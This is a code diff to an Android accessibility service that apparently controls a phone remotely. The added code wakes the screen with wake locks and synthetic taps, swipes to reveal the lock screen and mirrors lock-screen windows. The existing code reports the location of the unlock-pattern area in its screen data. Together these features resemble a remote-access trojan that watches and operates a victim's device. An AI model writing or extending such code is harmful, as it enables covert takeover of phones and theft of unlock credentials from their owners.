@@ -5,6 +5,7 @@ import android.accessibilityservice.GestureDescription
 import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
+import android.app.KeyguardManager
 import android.content.Context
 import android.content.Intent
 import android.media.AudioManager
@@ -15,6 +16,7 @@ import android.graphics.Path
 import kotlin.math.sqrt
 import android.os.Build
 import android.os.Bundle
+import android.os.PowerManager
 import android.os.Handler
 import android.os.Looper
 import android.provider.Settings
@@ -253,7 +255,7 @@ class ControleGestosService : AccessibilityService() {
         }
 
         val elementosLimpos = removerElementosRedundantes(listaElementos)
-        val telaBloqueio = detectarTelaBloqueioAtiva()
+        val telaBloqueio = detectarTelaBloqueioAtiva() || dispositivoBloqueado()
         val areaPadrao = if (telaBloqueio) detectarAreaPadrao(elementosLimpos) else null
         return montarJsonEstrutura(elementosLimpos, displayMetrics, areaPadrao, telaBloqueio)
     }
@@ -285,6 +287,7 @@ class ControleGestosService : AccessibilityService() {
             put("altura", displayMetrics.heightPixels)
             put("densidade", displayMetrics.densityDpi)
             put("tela_bloqueio", telaBloqueio)
+            put("tela_ligada", telaLigada())
             if (telaBloqueio && areaPadrao != null && areaPadrao.width() >= 120 && areaPadrao.height() >= 120) {
                 put("area_padrao", org.json.JSONObject().apply {
                     put("x", areaPadrao.left)
@@ -484,7 +487,23 @@ class ControleGestosService : AccessibilityService() {
 
     private fun obterTodasJanelasEspelho(): List<AccessibilityWindowInfo> {
         val janelas = windows ?: return emptyList()
-        val telaBloqueio = detectarTelaBloqueioAtiva()
+
+        if (!telaLigada()) {
+            val resultado = mutableListOf<AccessibilityWindowInfo>()
+            val ids = linkedSetOf<Int>()
+            fun adicionar(janela: AccessibilityWindowInfo) {
+                if (ids.add(janela.id)) resultado.add(janela)
+            }
+            obterJanelasKeyguard().forEach { adicionar(it) }
+            if (resultado.isNotEmpty()) return resultado
+            janelas.filter { janela ->
+                janela.root != null &&
+                    janela.type != AccessibilityWindowInfo.TYPE_ACCESSIBILITY_OVERLAY
+            }.forEach { adicionar(it) }
+            return resultado
+        }
+
+        val telaBloqueio = detectarTelaBloqueioAtiva() || dispositivoBloqueado()
 
         fun janelaAppValida(janela: AccessibilityWindowInfo): Boolean {
             val raiz = janela.root ?: return false
@@ -1690,8 +1709,9 @@ class ControleGestosService : AccessibilityService() {
                 executarArrasto(x1, y1, x2, y2)
             }
             "voltar"  -> performGlobalAction(GLOBAL_ACTION_BACK)
-            "inicio"  -> performGlobalAction(GLOBAL_ACTION_HOME)
-            "recentes"-> performGlobalAction(GLOBAL_ACTION_RECENTS)
+            "inicio"  -> executarAcaoComDespertar(GLOBAL_ACTION_HOME)
+            "recentes"-> executarAcaoComDespertar(GLOBAL_ACTION_RECENTS)
+            "despertar" -> despertarTela()
             "texto"   -> inserirTexto(partes.getOrNull(1) ?: "")
             "mostrar_overlay" -> mostrarOuAtualizarOverlay(partes.getOrNull(1) ?: "", "", "")
             "esconder_overlay", "overlay_desligar", "overlay_desativar" -> handlerPrincipal.post { removerOverlay() }
@@ -1701,6 +1721,85 @@ class ControleGestosService : AccessibilityService() {
             "som_menos", "volume_menos", "silenciar" -> ajustarVolume(subir = false)
             "limpar_notificacoes" -> limparNotificacoes()
         }
+    }
+
+    private fun telaLigada(): Boolean {
+        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
+        return pm.isInteractive
+    }
+
+    private fun dispositivoBloqueado(): Boolean {
+        val km = getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
+        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            km.isDeviceLocked
+        } else {
+            @Suppress("DEPRECATION")
+            km.isKeyguardLocked
+        }
+    }
+
+    private fun executarAcaoComDespertar(acao: Int) {
+        val estavaApagada = !telaLigada()
+        despertarTela()
+        val atraso = if (estavaApagada) 900L else 300L
+        handlerPrincipal.postDelayed({
+            if (estavaApagada) {
+                performGlobalAction(GLOBAL_ACTION_HOME)
+                handlerPrincipal.postDelayed({ revelarTelaBloqueioSeNecessario() }, 450L)
+                Log.i("KL", "Tela apagada — acordando e abrindo bloqueio")
+            } else {
+                performGlobalAction(acao)
+            }
+        }, atraso)
+    }
+
+    private fun revelarTelaBloqueioSeNecessario() {
+        if (!dispositivoBloqueado()) return
+        if (detectarTelaBloqueioAtiva()) return
+        val dm = resources.displayMetrics
+        val x = dm.widthPixels / 2f
+        executarArrasto(x, dm.heightPixels * 0.92f, x, dm.heightPixels * 0.22f)
+        Log.i("KL", "Deslize para revelar tela de bloqueio")
+    }
+
+    private fun despertarTela() {
+        try {
+            val intent = Intent(this, WakeScreenActivity::class.java).apply {
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
+            }
+            startActivity(intent)
+        } catch (e: Exception) {
+            Log.w("KL", "WakeScreenActivity falhou: ${e.message}")
+        }
+
+        try {
+            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
+            if (!pm.isInteractive) {
+                @Suppress("DEPRECATION")
+                val wakeLock = pm.newWakeLock(
+                    PowerManager.SCREEN_BRIGHT_WAKE_LOCK or
+                        PowerManager.ACQUIRE_CAUSES_WAKEUP or
+                        PowerManager.ON_AFTER_RELEASE,
+                    "kl:despertar"
+                )
+                wakeLock.acquire(5000L)
+                handlerPrincipal.postDelayed({
+                    try {
+                        if (wakeLock.isHeld) wakeLock.release()
+                    } catch (_: Exception) {
+                    }
+                }, 4000L)
+            }
+        } catch (e: Exception) {
+            Log.w("KL", "WakeLock falhou: ${e.message}")
+        }
+
+        val dm = resources.displayMetrics
+        val centroX = dm.widthPixels / 2f
+        val centroY = dm.heightPixels / 2f
+        executarToque(centroX, centroY)
+        handlerPrincipal.postDelayed({ executarToque(centroX, centroY) }, 150L)
+        Log.i("KL", "Comando despertar tela enviado")
     }
 
     private fun definirBrilho(percentual: Int) {
